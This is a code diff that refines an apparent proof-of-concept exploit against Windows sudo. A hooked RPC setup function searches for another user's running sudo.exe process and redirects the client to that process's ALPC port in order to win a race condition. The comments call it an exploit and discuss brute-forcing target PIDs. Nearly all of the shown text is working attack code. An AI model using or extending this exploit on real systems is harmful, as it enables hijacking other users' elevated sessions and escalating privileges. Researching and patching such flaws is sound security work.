@@ -21,6 +21,7 @@ typedef unsigned long long (__fastcall*fnSetupClient_t)(const char *);
 fnSetupClient_t OriginalSetupClient = NULL;
 char g_CurrentUser[UNLEN];
 DWORD g_targetPID = NULL;
+char g_targetAlpcPort[260];
 
 
 DWORD FindRunningSudo() {
@@ -75,19 +76,19 @@ DWORD FindRunningSudo() {
     return NULL;
 }
 
+// Luckily for us, the sudo logic will handle retrying this in a time-delayed loop, so
+// all we need to do is find a target PID and win the race.
 unsigned long long __fastcall HookedSetupClient(char *rpc_port_name) {
-    // Specify an open RPC port.
-    // The easiest way to reproduce this is to use windbg to hold the RPC socket open.
-    // A more robust exploit would brute force this, either by just trying all valid PIDs
-    // for the numbers or by enumerating running sudo.exe processes for other users using createtoolhelp32snapshot
-    char target_rpc_object[260];
-    OutputDebugStringA("Finding target PID...\n");
     while (g_targetPID == NULL) {
         g_targetPID = FindRunningSudo();
+        if (g_targetPID != NULL) {
+            snprintf(g_targetAlpcPort, 260, kSudoRpcFormat, g_targetPID);
+            char szDebugLog[300];
+            snprintf(szDebugLog, 300, "Targeting ALPC port %s\n", g_targetAlpcPort);
+            OutputDebugStringA(szDebugLog);
+        }
     }
-    snprintf(target_rpc_object, 260, kSudoRpcFormat, g_targetPID);
-    OutputDebugStringA(target_rpc_object);
-    return OriginalSetupClient(target_rpc_object);
+    return OriginalSetupClient(g_targetAlpcPort);
 }
 
 BOOL HookedShellExecuteExW(SHELLEXECUTEINFOW* pExecInfo) {
